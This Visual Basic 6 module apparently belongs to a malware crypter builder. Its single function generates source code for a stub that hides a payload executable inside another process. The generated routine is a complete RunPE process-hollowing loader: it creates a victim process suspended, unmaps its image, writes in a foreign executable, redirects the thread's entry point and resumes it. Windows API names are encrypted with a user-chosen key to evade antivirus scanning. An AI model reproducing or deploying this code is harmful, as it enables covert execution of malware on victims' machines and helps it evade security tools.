Attribute VB_Name = "mPe"
Public Function PE() As String
PE = PE & "Attribute VB_Name = " & X & F.Text1(3).Text & X & vbCrLf & vbNewLine
PE = PE & "Option Explicit" & vbCrLf & _
"Public Const TH32CS_SNAPHEAPLIST = &H1" & vbCrLf & _
"Public Const TH32CS_SNAPPROCESS = &H2" & vbCrLf & _
"Public Const TH32CS_SNAPTHREAD = &H4" & vbCrLf & _
"Public Const TH32CS_SNAPMODULE = &H8" & vbCrLf & _
"Public Const TH32CS_SNAPALL = (TH32CS_SNAPHEAPLIST Or TH32CS_SNAPPROCESS Or TH32CS_SNAPTHREAD Or TH32CS_SNAPMODULE)" & vbCrLf & _
"Public Const TH32CS_INHERIT = &H80000000" & vbCrLf & _
"Public Const MAX_PATH As Integer = 260" & vbCrLf & _
"Public Const PROCESS_ALL_ACCESS = &H1F0FFF" & vbCrLf & _
"Public Const PROCESS_QUERY_INFORMATION = &H400&" & vbCrLf & _
"Public Const PROCESS_VM_READ = &H10&" & vbCrLf & _
"Public Type PROCESSENTRY32" & vbCrLf & _
"    dwSize As Long" & vbCrLf & _
"    cntUsage As Long" & vbCrLf & _
"    th32ProcessID As Long" & vbCrLf & _
"    th32DefaultHeapID As Long" & vbCrLf & _
"    th32ModuleID As Long" & vbCrLf & _
"    cntThreads As Long" & vbCrLf & _
"    th32ParentProcessID As Long" & vbCrLf & _
"    pcPriClassBase As Long" & vbCrLf & _
"    dwFlags As Long" & vbCrLf & _
"    szExeFile As String * MAX_PATH" & vbCrLf & _
"End Type" & vbCrLf
PE = PE & "Public Type MODULEENTRY32" & vbCrLf & _
"  dwSize As Long" & vbCrLf & _
"  th32ModuleID As Long" & vbCrLf & _
"  th32ProcessID As Long" & vbCrLf & _
"  GlblcntUsage As Long" & vbCrLf & _
"  ProccntUsage As Long" & vbCrLf & _
"  modBaseAddr As Long" & vbCrLf & _
"  modBaseSize As Long" & vbCrLf & _
"  hModule As Long" & vbCrLf & _
"  szModule As String * 256" & vbCrLf & _
"  szExePath As String * 260" & vbCrLf & _
"End Type" & vbCrLf & _
"Const SIZE_OF_80387_REGISTERS = 80" & vbCrLf & _
"Public Type FLOATING_SAVE_AREA" & vbCrLf & _
"     ControlWord As Long" & vbCrLf & _
"     StatusWord As Long" & vbCrLf & _
"     TagWord As Long" & vbCrLf & _
"     ErrorOffset As Long" & vbCrLf & _
"     ErrorSelector As Long" & vbCrLf & _
"     DataOffset As Long" & vbCrLf & _
"     DataSelector As Long" & vbCrLf & _
"     RegisterArea(1 To SIZE_OF_80387_REGISTERS) As Byte" & vbCrLf & _
"     Cr0NpxState As Long" & vbCrLf & _
"End Type" & vbCrLf
PE = PE & "Public Type CONTEXT86" & vbCrLf & _
"    ContextFlags As Long" & vbCrLf & _
"    Dr0 As Long" & vbCrLf & _
"    Dr1 As Long" & vbCrLf & _
"    Dr2 As Long" & vbCrLf & _
"    Dr3 As Long" & vbCrLf & _
"    Dr6 As Long" & vbCrLf & _
"    Dr7 As Long" & vbCrLf & _
"    FloatSave As FLOATING_SAVE_AREA" & vbCrLf & _
"    SegGs As Long" & vbCrLf & _
"    SegFs As Long" & vbCrLf & _
"    SegEs As Long" & vbCrLf & _
"    SegDs As Long" & vbCrLf & _
"    Edi As Long" & vbCrLf & _
"    Esi As Long" & vbCrLf & _
"    Ebx As Long" & vbCrLf & _
"    Edx As Long" & vbCrLf & _
"    Ecx As Long" & vbCrLf & _
"    Eax As Long" & vbCrLf & _
"    Ebp As Long" & vbCrLf & _
"    Eip As Long" & vbCrLf & _
"    SegCs As Long" & vbCrLf & _
"    EFlags As Long" & vbCrLf & _
"    Esp As Long" & vbCrLf & _
"    SegSs As Long" & vbCrLf
PE = PE & "End Type" & vbCrLf
PE = PE & "Public Const CONTEXT_X86 = &H10000" & vbCrLf & _
"Public Const CONTEXT86_CONTROL = (CONTEXT_X86 Or &H1)" & vbCrLf & _
"Public Const CONTEXT86_INTEGER = (CONTEXT_X86 Or &H2)" & vbCrLf & _
"Public Const CONTEXT86_SEGMENTS = (CONTEXT_X86 Or &H4)" & vbCrLf & _
"Public Const CONTEXT86_FLOATING_POINT = (CONTEXT_X86 Or &H8)" & vbCrLf & _
"Public Const CONTEXT86_DEBUG_REGISTERS = (CONTEXT_X86 Or &H10)" & vbCrLf & _
"Public Const CONTEXT86_FULL = (CONTEXT86_CONTROL Or CONTEXT86_INTEGER Or CONTEXT86_SEGMENTS)" & vbCrLf & _
"Public Type PROCESS_INFORMATION" & vbCrLf & _
"   hProcess As Long" & vbCrLf & _
"   hThread As Long" & vbCrLf & _
"   dwProcessID As Long" & vbCrLf & _
"   dwThreadID As Long" & vbCrLf & _
"End Type" & vbCrLf & _
"Public Type STARTUPINFO" & vbCrLf & _
"   cb As Long" & vbCrLf & _
"   lpReserved As String" & vbCrLf & _
"   lpDesktop As String" & vbCrLf & _
"   lpTitle As String" & vbCrLf & _
"   dwX As Long" & vbCrLf & _
"   dwY As Long" & vbCrLf & _
"   dwXSize As Long" & vbCrLf & _
"   dwYSize As Long" & vbCrLf & _
"   dwXCountChars As Long" & vbCrLf & _
"   dwYCountChars As Long" & vbCrLf & _
"   dwFillAttribute As Long" & vbCrLf
PE = PE & "   dwFlags As Long" & vbCrLf & _
"   wShowWindow As Integer" & vbCrLf & _
"   cbReserved2 As Integer" & vbCrLf & _
"   lpReserved2 As Long" & vbCrLf & _
"   hStdInput As Long" & vbCrLf & _
"   hStdOutput As Long" & vbCrLf & _
"   hStdError As Long" & vbCrLf & _
"End Type" & vbCrLf & _
"Public Declare Sub CopyMemory Lib " & X & "kernel32" & X & " Alias " & X & "RtlMoveMemory" & X & " (dest As Any, Src As Any, ByVal L As Long)" & vbCrLf
PE = PE & "Public Const CREATE_SUSPENDED = &H4" & vbCrLf & _
"Public Const MEM_COMMIT As Long = &H1000&" & vbCrLf & _
"Public Const MEM_RESERVE As Long = &H2000&" & vbCrLf & _
"Public Const PAGE_NOCACHE As Long = &H200" & vbCrLf & _
"Public Const PAGE_EXECUTE_READWRITE As Long = &H40" & vbCrLf & _
"Public Const PAGE_EXECUTE_WRITECOPY As Long = &H80" & vbCrLf & _
"Public Const PAGE_EXECUTE_READ As Long = &H20" & vbCrLf & _
"Public Const PAGE_EXECUTE As Long = &H10" & vbCrLf & _
"Public Const PAGE_READONLY As Long = &H2" & vbCrLf & _
"Public Const PAGE_WRITECOPY As Long = &H8" & vbCrLf & _
"Public Const PAGE_NOACCESS As Long = &H1" & vbCrLf & _
"Public Const PAGE_READWRITE As Long = &H4" & vbCrLf & _
"Public Enum ImageSignatureTypes" & vbCrLf & _
"    IMAGE_DOS_SIGNATURE = &H5A4D" & vbCrLf & _
"    IMAGE_OS2_SIGNATURE = &H454E" & vbCrLf & _
"    IMAGE_OS2_SIGNATURE_LE = &H454C" & vbCrLf & _
"    IMAGE_VXD_SIGNATURE = &H454C" & vbCrLf & _
"    IMAGE_NT_SIGNATURE = &H4550" & vbCrLf & _
"End Enum" & vbCrLf
PE = PE & "Public Type IMAGE_DOS_HEADER" & vbCrLf & _
"    e_magic As Integer" & vbCrLf & _
"    e_cblp As Integer" & vbCrLf & _
"    e_cp As Integer" & vbCrLf & _
"    e_crlc As Integer" & vbCrLf & _
"    e_cparhdr As Integer" & vbCrLf & _
"    e_minalloc As Integer" & vbCrLf & _
"    e_maxalloc As Integer" & vbCrLf & _
"    e_ss As Integer" & vbCrLf & _
"    e_sp As Integer" & vbCrLf & _
"    e_csum As Integer" & vbCrLf & _
"    e_ip As Integer" & vbCrLf & _
"    e_cs As Integer" & vbCrLf & _
"    e_lfarlc As Integer" & vbCrLf & _
"    e_ovno As Integer" & vbCrLf & _
"    e_res(0 To 3) As Integer" & vbCrLf & _
"    e_oemid As Integer" & vbCrLf & _
"    e_oeminfo As Integer" & vbCrLf & _
"    e_res2(0 To 9) As Integer" & vbCrLf & _
"    e_lfanew As Long" & vbCrLf & _
"End Type" & vbCrLf
PE = PE & "Public Type IMAGE_FILE_HEADER" & vbCrLf & _
"    Machine As Integer" & vbCrLf & _
"    NumberOfSections As Integer" & vbCrLf & _
"    TimeDateStamp As Long" & vbCrLf & _
"    PointerToSymbolTable As Long" & vbCrLf & _
"    NumberOfSymbols As Long" & vbCrLf & _
"    SizeOfOptionalHeader As Integer" & vbCrLf & _
"    characteristics As Integer" & vbCrLf & _
"End Type" & vbCrLf & _
"Public Type IMAGE_DATA_DIRECTORY" & vbCrLf & _
"    VirtualAddress As Long" & vbCrLf & _
"    Size As Long" & vbCrLf & _
"End Type" & vbCrLf
PE = PE & "Public Const IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16" & vbCrLf & _
"Public Type IMAGE_OPTIONAL_HEADER" & vbCrLf & _
"    Magic As Integer" & vbCrLf & _
"    MajorLinkerVersion As Byte" & vbCrLf & _
"    MinorLinkerVersion As Byte" & vbCrLf & _
"    SizeOfCode As Long" & vbCrLf & _
"    SizeOfInitializedData As Long" & vbCrLf & _
"    SizeOfUnitializedData As Long" & vbCrLf & _
"    AddressOfEntryPoint As Long" & vbCrLf & _
"    BaseOfCode As Long" & vbCrLf & _
"    BaseOfData As Long" & vbCrLf & _
"    ImageBase As Long" & vbCrLf & _
"    SectionAlignment As Long" & vbCrLf & _
"    FileAlignment As Long" & vbCrLf & _
"    MajorOperatingSystemVersion As Integer" & vbCrLf & _
"    MinorOperatingSystemVersion As Integer" & vbCrLf & _
"    MajorImageVersion As Integer" & vbCrLf & _
"    MinorImageVersion As Integer" & vbCrLf & _
"    MajorSubsystemVersion As Integer" & vbCrLf & _
"    MinorSubsystemVersion As Integer" & vbCrLf & _
"    W32VersionValue As Long" & vbCrLf & _
"    SizeOfImage As Long" & vbCrLf & _
"    SizeOfHeaders As Long" & vbCrLf & _
"    CheckSum As Long" & vbCrLf & _
"    SubSystem As Integer" & vbCrLf
PE = PE & "    DllCharacteristics As Integer" & vbCrLf & _
"    SizeOfStackReserve As Long" & vbCrLf & _
"    SizeOfStackCommit As Long" & vbCrLf & _
"    SizeOfHeapReserve As Long" & vbCrLf & _
"    SizeOfHeapCommit As Long" & vbCrLf & _
"    LoaderFlags As Long" & vbCrLf & _
"    NumberOfRvaAndSizes As Long" & vbCrLf & _
"    DataDirectory(0 To IMAGE_NUMBEROF_DIRECTORY_ENTRIES - 1) As IMAGE_DATA_DIRECTORY" & vbCrLf & _
"End Type" & vbCrLf & _
"Public Type IMAGE_NT_HEADERS" & vbCrLf & _
"    Signature As Long" & vbCrLf & _
"    FileHeader As IMAGE_FILE_HEADER" & vbCrLf & _
"    OptionalHeader As IMAGE_OPTIONAL_HEADER" & vbCrLf & _
"End Type" & vbCrLf & _
"Const IMAGE_SIZEOF_SHORT_NAME = 8" & vbCrLf & _
"Public Type IMAGE_SECTION_HEADER" & vbCrLf & _
"   SecName As String * IMAGE_SIZEOF_SHORT_NAME" & vbCrLf & _
"   VirtualSize As Long" & vbCrLf & _
"   VirtualAddress  As Long" & vbCrLf & _
"   SizeOfRawData As Long" & vbCrLf & _
"   PointerToRawData As Long" & vbCrLf & _
"   PointerToRelocations As Long" & vbCrLf & _
"   PointerToLinenumbers As Long" & vbCrLf & _
"   NumberOfRelocations As Integer" & vbCrLf & _
"   NumberOfLinenumbers As Integer" & vbCrLf
PE = PE & "   characteristics  As Long" & vbCrLf & _
"End Type" & vbCrLf & _
"Const OFFSET_4 = 4294967296#" & vbCrLf
PE = PE & "Public Function RunExe(ByVal sVictim As String, abExeFile() As Byte, Optional lpszCommandLine As String) As Long" & vbCrLf & _
"    Dim addr As Long, lOffset As Long" & vbCrLf & _
"    Dim s2 As String * 256" & vbCrLf & _
"    Dim IDH As IMAGE_DOS_HEADER" & vbCrLf & _
"    Dim context As CONTEXT86" & vbCrLf & _
"    Dim pi As PROCESS_INFORMATION, Ret As Long, i As Long" & vbCrLf & _
"    Dim b2(0 To 1024) As Byte" & vbCrLf & _
"    Dim INH As IMAGE_NT_HEADERS" & vbCrLf & _
"    Dim ISH As IMAGE_SECTION_HEADER" & vbCrLf & _
"    Dim si As STARTUPINFO" & vbCrLf & _
"    Dim sKernel32 As String" & vbCrLf & _
"    Dim ImageBase As Long" & vbCrLf & _
"    sKernel32 = Decrypt(" & X & Encrypt("kernel32", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & vbCrLf & _
"    CopyMemory IDH, abExeFile(0), Len(IDH)" & vbCrLf & _
"    If IDH.e_magic <> IMAGE_DOS_SIGNATURE Then" & vbCrLf & _
"        RunExe = -1" & vbCrLf & _
"       Exit Function" & vbCrLf & _
"    End If" & vbCrLf & _
"    CopyMemory INH, abExeFile(IDH.e_lfanew), Len(INH)" & vbCrLf & _
"    If INH.Signature <> IMAGE_NT_SIGNATURE Then" & vbCrLf & _
"        RunExe = -1" & vbCrLf & _
"       Exit Function" & vbCrLf & _
"    End If" & vbCrLf
PE = PE & "    Dim s1 As String, b1() As Byte" & vbCrLf & _
"    si.cb = Len(si)" & vbCrLf & _
"    If lpszCommandLine = " & X & "" & X & " Then" & vbCrLf & _
"        b1 = StrConv(sVictim, vbFromUnicode)" & vbCrLf & _
"    Else" & vbCrLf & _
"        b1 = StrConv(Chr(34) & sVictim & Chr(34) & " & X & " " & X & " & LTrim(lpszCommandLine), vbFromUnicode)" & vbCrLf & _
"    End If" & vbCrLf & _
"    s1 = vbNullString" & vbCrLf & _
"    If CallAPIByName(sKernel32, Decrypt(" & X & Encrypt("CreateProcessA", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", StrPtr(s1), VarPtr(b1(0)), 0, 0, False, CREATE_SUSPENDED, 0, 0, VarPtr(si), VarPtr(pi)) = 0 Then" & vbCrLf & _
"       Exit Function" & vbCrLf & _
"    End If" & vbCrLf & _
"    context.ContextFlags = CONTEXT86_INTEGER" & vbCrLf & _
"    If CallAPIByName(sKernel32, Decrypt(" & X & Encrypt("GetThreadContext", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", pi.hThread, VarPtr(context)) = 0 Then RunExe = -1: GoTo ClearProcess" & vbCrLf & _
"    Call CallAPIByName(sKernel32, Decrypt(" & X & Encrypt("ReadProcessMemory", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", pi.hProcess, context.Ebx + 8, VarPtr(addr), 4, 0)" & vbCrLf & _
"    If addr = 0 Then RunExe = -1: GoTo ClearProcess" & vbCrLf & _
"    If CallAPIByName(" & "Decrypt(" & X & Encrypt("ntdll", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", Decrypt(" & X & Encrypt("ZwUnmapViewOfSection", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", pi.hProcess, addr) Then GoTo ClearProcess" & vbCrLf & _
"    ImageBase = CallAPIByName(sKernel32, Decrypt(" & X & Encrypt("VirtualAllocEx", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", pi.hProcess, INH.OptionalHeader.ImageBase, INH.OptionalHeader.SizeOfImage, MEM_RESERVE Or MEM_COMMIT, PAGE_READWRITE)" & vbCrLf & _
"    If ImageBase = 0 Then RunExe = -1: GoTo ClearProcess" & vbCrLf & _
"    Call CallAPIByName(sKernel32, Decrypt(" & X & Encrypt("WriteProcessMemory", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", pi.hProcess, ImageBase, VarPtr(abExeFile(0)), INH.OptionalHeader.SizeOfHeaders, VarPtr(Ret))" & vbCrLf & _
"    lOffset = IDH.e_lfanew + Len(INH)" & vbCrLf & _
"    For i = 0 To INH.FileHeader.NumberOfSections - 1" & vbCrLf & _
"        CopyMemory ISH, abExeFile(lOffset + i * Len(ISH)), Len(ISH)" & vbCrLf & _
"        Call CallAPIByName(sKernel32, Decrypt(" & X & Encrypt("WriteProcessMemory", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", pi.hProcess, ImageBase + ISH.VirtualAddress, VarPtr(abExeFile(ISH.PointerToRawData)), ISH.SizeOfRawData, VarPtr(Ret))" & vbCrLf & _
"        Call CallAPIByName(sKernel32, Decrypt(" & X & Encrypt("VirtualProtectEx", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", pi.hProcess, ImageBase + ISH.VirtualAddress, ISH.VirtualSize, Protect(ISH.characteristics), VarPtr(addr))" & vbCrLf
PE = PE & "    Next i" & vbCrLf & _
"    Call CallAPIByName(sKernel32, Decrypt(" & X & Encrypt("WriteProcessMemory", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", pi.hProcess, context.Ebx + 8, VarPtr(ImageBase), 4, VarPtr(Ret))" & vbCrLf & _
"    context.Eax = ImageBase + INH.OptionalHeader.AddressOfEntryPoint" & vbCrLf & _
"    Call CallAPIByName(sKernel32, Decrypt(" & X & Encrypt("SetThreadContext", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", pi.hThread, VarPtr(context))" & vbCrLf & _
"    Call CallAPIByName(sKernel32, Decrypt(" & X & Encrypt("ResumeThread", F.Text2.Text) & X & ", " & X & F.Text2.Text & X & ")" & ", pi.hThread)" & vbCrLf & _
"    RunExe = pi.dwProcessID" & vbCrLf & _
"    Exit Function" & vbCrLf & _
"ClearProcess:" & vbCrLf & _
"    CloseHandle pi.hThread" & vbCrLf & _
"    CloseHandle pi.hProcess" & vbCrLf & _
"End Function" & vbCrLf & _
"Private Function Protect(ByVal characteristics As Long) As Long" & vbCrLf & _
"   Dim mapping As Variant" & vbCrLf & _
"   mapping = Array(PAGE_NOACCESS, PAGE_EXECUTE, PAGE_READONLY, _" & vbCrLf & _
"                   PAGE_EXECUTE_READ, PAGE_READWRITE, PAGE_EXECUTE_READWRITE, _" & vbCrLf & _
"                   PAGE_READWRITE, PAGE_EXECUTE_READWRITE)" & vbCrLf & _
"  Protect = mapping(RShift(characteristics, 29))" & vbCrLf & _
"End Function" & vbCrLf & _
"Private Function RShift(ByVal lValue As Long, ByVal lNumberOfBitsToShift As Long) As Long" & vbCrLf & _
"    RShift = vbLongToULong(lValue) / (2 ^ lNumberOfBitsToShift)" & vbCrLf & _
"End Function" & vbCrLf & _
"Private Function vbLongToULong(ByVal Value As Long) As Double" & vbCrLf & _
"    If Value < 0 Then" & vbCrLf & _
"        vbLongToULong = Value + OFFSET_4" & vbCrLf & _
"    Else" & vbCrLf
PE = PE & "        vbLongToULong = Value" & vbCrLf & _
"    End If" & vbCrLf & _
"End Function" & vbCrLf




End Function
